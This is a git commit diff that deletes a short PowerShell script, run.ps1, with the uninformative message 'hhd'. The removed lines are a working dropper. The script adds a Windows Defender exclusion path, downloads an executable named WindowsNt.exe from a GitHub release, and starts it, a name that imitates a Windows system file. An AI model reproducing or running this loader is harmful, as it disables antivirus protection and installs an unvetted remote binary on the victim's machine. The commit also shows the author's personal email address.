1db4b795dd09c1229e3688c1addb8e6b0191d869
SAKIB-SALIM <salimsakib775@gmail.com>
2024-12-05 21:57:37 +0600

    hhd

--- run.ps1
+++
@@ -1,5 +0,0 @@
-$path = "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Temp"
-Set-MpPreference -ExclusionPath $path
-Invoke-WebRequest -Uri "https://github.com/SAKIB-SALIM/C/releases/latest/download/WindowsNt.exe" -OutFile "$env:TEMP\WindowsNt.exe"
-Start-Process "$env:TEMP\WindowsNt.exe"
-exit;
